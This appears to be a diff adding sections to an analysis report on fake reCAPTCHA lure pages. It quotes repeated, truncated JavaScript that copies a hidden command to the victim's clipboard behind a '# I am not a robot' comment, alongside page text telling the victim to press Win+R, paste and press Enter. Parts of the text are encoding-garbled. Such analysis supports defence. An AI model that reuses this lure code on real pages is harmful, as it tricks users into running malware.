+<strong>Examples</strong>: <code>removeChild</code></p>
+<h3>Malicious Payload Construction</h3>
+<p><em>How the final clipboard payload is assembled:</em></p>
+<h4>Command Concatenation</h4>
+<p><strong>Instances</strong>: 2
+<strong>Examples:</strong>
+- <code>commandToRun +</code></p>
+<h4>Verification Text</h4>
+<p><strong>Instances</strong>: 1
+<strong>Examples:</strong>
+- <code>"copy"); document.body.removeChild(tempTextA... ...ck", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "21px 0 0 12px"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" &amp;&amp; verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "â ''I am not a robot - reCAPTCHA Verification Hash: " const end = "''" const textToCopy = commandToRun + suffix + ploy + verification_id + end setClipboardCopyData(textToCopy); } function showVerifyWindow()... ...dy.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");... ...tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempText... ...k", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "0"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" &amp;&amp; verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "â ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {... ...y.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");... ...tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempText... ...k", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "0"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" &amp;&amp; verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {... ...y.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");... ...tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempText... ...k", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "0"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" &amp;&amp; verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {... ...y.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");... ...tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempText... ...k", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "0"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" &amp;&amp; verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "â ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {... ...y.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");... ...); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextA... ...ck", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "21px 0 0 12px"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" &amp;&amp; verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "â ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun + suffix + ploy + verification_id + end setClipboardCopyData(textToCopy); } function showVerifyWindow()... ...dy.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");... &lt;img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""&gt; ...="" id="spinner"&gt; &lt;/div&gt; &lt;div id="verify-window" class="verify-window"&gt; &lt;div class="verify-container"&gt; &lt;header class="verify-header"&gt; &lt;span class="verify-header-text-medium m-p block"&gt;Complete these&lt;/span&gt; &lt;span class="verify-header-text-big m-p block"&gt;Verification Steps&lt;/span&gt; &lt;span class="verify-header-text-medium m-p block"&gt;&lt;/span&gt; &lt;/header&gt; &lt;main class="verify-main"&gt; &lt;p&gt; To better prove you are not a robot, please: &lt;/p&gt; &lt;ol&gt; &lt;li&gt; Press &amp; hold the Windows Key &lt;i class="fab fa-windows"&gt;&lt;/i&gt; + &lt;b&gt;R&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; In the verification window, press &lt;b&gt;Ctrl&lt;/b&gt; + &lt;b&gt;V&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; Press &lt;b&gt;Enter&lt;/b&gt; on your keyboard to finish. &lt;/li&gt; &lt;/ol&gt; &lt;p&gt; You will observe and agree: &lt;br&gt; &lt;code&gt; â "I am not a robot - reCAPTCHA Verification Hash: &lt;span id="verification-id"&gt;1110&lt;/span&gt;" &lt;/code&gt; &lt;/p&gt; &lt;/main&gt; &lt;/div&gt; &lt;footer class="verify-container verif... &lt;div class="verify-footer-left"&gt; Perform the steps above to finish verification. &lt;/div&gt; &lt;p class="im-not-a-robot m-p line-normal"&gt;I'm not a robot&lt;/p&gt; &lt;img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""&gt; ...&lt;div class="overlay" id="overlay"&gt;&lt;/div&gt; &lt;div class="recaptcha-box"&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p&gt;Please verify that you are a human to continue.&lt;/p&gt; &lt;div class="container m-p"&gt; &lt;div id="checkbox-window" class="checkbox-window m-p block"&gt; &lt;div class="checkbox-container m-p"&gt; &lt;button type="button" id="checkbox" class="checkbox m-p line-normal"&gt;&lt;/button&gt; &lt;/div&gt; &lt;p style="margin: 0 !important;" cla... ...id="spinner"&gt; &lt;/div&gt; &lt;div id="verify-window" class="verify-window"&gt; &lt;div class="verify-container"&gt; &lt;header class="verify-header"&gt; &lt;span class="verify-header-text-medium m-p block"&gt;Complete these&lt;/span&gt; &lt;span class="verify-header-text-big m-p block"&gt;Verification Steps&lt;/span&gt; &lt;span class="verify-header-text-medium m-p block"&gt;&lt;/span&gt; &lt;/header&gt; &lt;main class="verify-main"&gt; &lt;p&gt; To better prove you are not a robot, please: &lt;/p&gt; &lt;ol&gt; &lt;li&gt; Press &amp; hold the Windows Key &lt;i class="fab fa-windows"&gt;&lt;/i&gt; + &lt;b&gt;R&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; In the verification window, press &lt;b&gt;Ctrl&lt;/b&gt; + &lt;b&gt;V&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; Press &lt;b&gt;Enter&lt;/b&gt; on your keyboard to finish. &lt;/li&gt; &lt;/ol&gt; &lt;p&gt; You will observe and agree: &lt;br&gt; &lt;code&gt; â "I am not a robot - reCAPTCHA Verification ID: &lt;span id="verification-id"&gt;146820&lt;/span&gt;" &lt;/code&gt; &lt;/p&gt; &lt;/main&gt; &lt;/div&gt; &lt;footer class="verify-container veri... &lt;div class="verify-footer-left"&gt; Perform the steps above to finish verification. &lt;/div&gt; &lt;title&gt;Verify You Are Human&lt;/title&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p style="margin: 0 !important;" class="im-not-a-robot m-p line-normal"&gt;I'm not a robot&lt;/p&gt; &lt;img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""&gt; ...&lt;div class="overlay" id="overlay"&gt;&lt;/div&gt; &lt;div class="recaptcha-box"&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p&gt;Please verify that you are a human to continue.&lt;/p&gt; &lt;div class="container m-p"&gt; &lt;div id="checkbox-window" class="checkbox-window m-p block"&gt; &lt;div class="checkbox-container m-p"&gt; &lt;button type="button" id="checkbox" class="checkbox m-p line-normal"&gt;&lt;/button&gt; &lt;/div&gt; &lt;p style="margin: 0 !important;" cla... ...id="spinner"&gt; &lt;/div&gt; &lt;div id="verify-window" class="verify-window"&gt; &lt;div class="verify-container"&gt; &lt;header class="verify-header"&gt; &lt;span class="verify-header-text-medium m-p block"&gt;Complete these&lt;/span&gt; &lt;span class="verify-header-text-big m-p block"&gt;Verification Steps&lt;/span&gt; &lt;span class="verify-header-text-medium m-p block"&gt;&lt;/span&gt; &lt;/header&gt; &lt;main class="verify-main"&gt; &lt;p&gt; To better prove you are not a robot, please: &lt;/p&gt; &lt;ol&gt; &lt;li&gt; Press &amp; hold the Windows Key &lt;i class="fab fa-windows"&gt;&lt;/i&gt; + &lt;b&gt;R&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; In the verification window, press &lt;b&gt;Ctrl&lt;/b&gt; + &lt;b&gt;V&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; Press &lt;b&gt;Enter&lt;/b&gt; on your keyboard to finish. &lt;/li&gt; &lt;/ol&gt; &lt;p&gt; You will observe and agree: &lt;br&gt; &lt;code&gt; ✅ "I am not a robot - reCAPTCHA Verification ID: &lt;span id="verification-id"&gt;146820&lt;/span&gt;" &lt;/code&gt; &lt;/p&gt; &lt;/main&gt; &lt;/div&gt; &lt;footer class="verify-container veri... &lt;div class="verify-footer-left"&gt; Perform the steps above to finish verification. &lt;/div&gt; &lt;title&gt;Verify You Are Human&lt;/title&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p style="margin: 0 !important;" class="im-not-a-robot m-p line-normal"&gt;I'm not a robot&lt;/p&gt; &lt;img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""&gt; ...&lt;div class="overlay" id="overlay"&gt;&lt;/div&gt; &lt;div class="recaptcha-box"&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p&gt;Please verify that you are a human to continue.&lt;/p&gt; &lt;div class="container m-p"&gt; &lt;div id="checkbox-window" class="checkbox-window m-p block"&gt; &lt;div class="checkbox-container m-p"&gt; &lt;button type="button" id="checkbox" class="checkbox m-p line-normal"&gt;&lt;/button&gt; &lt;/div&gt; &lt;p style="margin: 0 !important;" cla... ...id="spinner"&gt; &lt;/div&gt; &lt;div id="verify-window" class="verify-window"&gt; &lt;div class="verify-container"&gt; &lt;header class="verify-header"&gt; &lt;span class="verify-header-text-medium m-p block"&gt;Complete these&lt;/span&gt; &lt;span class="verify-header-text-big m-p block"&gt;Verification Steps&lt;/span&gt; &lt;span class="verify-header-text-medium m-p block"&gt;&lt;/span&gt; &lt;/header&gt; &lt;main class="verify-main"&gt; &lt;p&gt; To better prove you are not a robot, please: &lt;/p&gt; &lt;ol&gt; &lt;li&gt; Press &amp; hold the Windows Key &lt;i class="fab fa-windows"&gt;&lt;/i&gt; + &lt;b&gt;R&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; In the verification window, press &lt;b&gt;Ctrl&lt;/b&gt; + &lt;b&gt;V&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; Press &lt;b&gt;Enter&lt;/b&gt; on your keyboard to finish. &lt;/li&gt; &lt;/ol&gt; &lt;p&gt; You will observe and agree: &lt;br&gt; &lt;code&gt; ✅ "I am not a robot - reCAPTCHA Verification ID: &lt;span id="verification-id"&gt;146820&lt;/span&gt;" &lt;/code&gt; &lt;/p&gt; &lt;/main&gt; &lt;/div&gt; &lt;footer class="verify-container veri... &lt;div class="verify-footer-left"&gt; Perform the steps above to finish verification. &lt;/div&gt; &lt;title&gt;Verify You Are Human&lt;/title&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p style="margin: 0 !important;" class="im-not-a-robot m-p line-normal"&gt;I'm not a robot&lt;/p&gt; &lt;img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""&gt; ...&lt;div class="overlay" id="overlay"&gt;&lt;/div&gt; &lt;div class="recaptcha-box"&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p&gt;Please verify that you are a human to continue.&lt;/p&gt; &lt;div class="container m-p"&gt; &lt;div id="checkbox-window" class="checkbox-window m-p block"&gt; &lt;div class="checkbox-container m-p"&gt; &lt;button type="button" id="checkbox" class="checkbox m-p line-normal"&gt;&lt;/button&gt; &lt;/div&gt; &lt;p style="margin: 0 !important;" cla... ...id="spinner"&gt; &lt;/div&gt; &lt;div id="verify-window" class="verify-window"&gt; &lt;div class="verify-container"&gt; &lt;header class="verify-header"&gt; &lt;span class="verify-header-text-medium m-p block"&gt;Complete these&lt;/span&gt; &lt;span class="verify-header-text-big m-p block"&gt;Verification Steps&lt;/span&gt; &lt;span class="verify-header-text-medium m-p block"&gt;&lt;/span&gt; &lt;/header&gt; &lt;main class="verify-main"&gt; &lt;p&gt; To better prove you are not a robot, please: &lt;/p&gt; &lt;ol&gt; &lt;li&gt; Press &amp; hold the Windows Key &lt;i class="fab fa-windows"&gt;&lt;/i&gt; + &lt;b&gt;R&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; In the verification window, press &lt;b&gt;Ctrl&lt;/b&gt; + &lt;b&gt;V&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; Press &lt;b&gt;Enter&lt;/b&gt; on your keyboard to finish. &lt;/li&gt; &lt;/ol&gt; &lt;p&gt; You will observe and agree: &lt;br&gt; &lt;code&gt; â "I am not a robot - reCAPTCHA Verification ID: &lt;span id="verification-id"&gt;146820&lt;/span&gt;" &lt;/code&gt; &lt;/p&gt; &lt;/main&gt; &lt;/div&gt; &lt;footer class="verify-container veri... &lt;div class="verify-footer-left"&gt; Perform the steps above to finish verification. &lt;/div&gt; &lt;title&gt;Verify You Are Human&lt;/title&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p style="margin: 0 !important;" class="im-not-a-robot m-p line-normal"&gt;I'm not a robot&lt;/p&gt; &lt;img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""&gt; ...="" id="spinner"&gt; &lt;/div&gt; &lt;div id="verify-window" class="verify-window"&gt; &lt;div class="verify-container"&gt; &lt;header class="verify-header"&gt; &lt;span class="verify-header-text-medium m-p block"&gt;å®æè¿äº&lt;/span&gt; &lt;span class="verify-header-text-big m-p block"&gt;éªè¯æ­¥éª¤&lt;/span&gt; &lt;span class="verify-header-text-medium m-p block"&gt;&lt;/span&gt; &lt;/header&gt; &lt;main class="verify-main"&gt; &lt;p&gt; ä¸ºäºæ´å¥½çè¯ææ¨ä¸æ¯æºå¨äººï¼è¯·: &lt;/p&gt; &lt;ol&gt; &lt;li&gt; æä½Windowsé® &lt;i class="fab fa-windows"&gt;&lt;/i&gt; + &lt;b&gt;R&lt;/b&gt;ã &lt;/li&gt; &lt;li&gt; å¨éªè¯çªå£ä¸­ï¼æ &lt;b&gt;Ctrl&lt;/b&gt; + &lt;b&gt;V&lt;/b&gt;ã &lt;/li&gt; &lt;li&gt; æä¸é®çä¸ç &lt;b&gt;Enter&lt;/b&gt; é®å®æã &lt;/li&gt; &lt;/ol&gt; &lt;p&gt; æ¨å°éµå®å¹¶åæ: &lt;br&gt; &lt;code&gt; â "I am not a robot - reCAPTCHA Verification ID: &lt;span id="verification-id"&gt;146820&lt;/span&gt;" &lt;/code&gt; &lt;/p&gt; &lt;/main&gt; &lt;/div&gt; &lt;footer class="verify-container verif... &lt;div class="verify-footer-left"&gt; æ§è¡ä¸è¿°æ­¥éª¤å³å¯å®æéªè¯ã &lt;/div&gt; &lt;p class="im-not-a-robot m-p line-normal"&gt;I'</code></p>
+<h4>Hash Generation</h4>
+<p><strong>Instances</strong>: 1
+<strong>Examples:</strong>
+- <code>verification_id){ const suffix = " # " const ploy = "â ''I am not a robot - reCAPTCHA Verification Hash: " const end = "''" const textToCopy = commandToRun + suffix + ploy + verification_id + end setClipboardCopyData(textToCopy); } function showVerifyWindow()... ...dy.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");... ...tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempText... ...k", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "0"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" &amp;&amp; verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "â ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {... ...y.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");... ...tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempText... ...k", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function 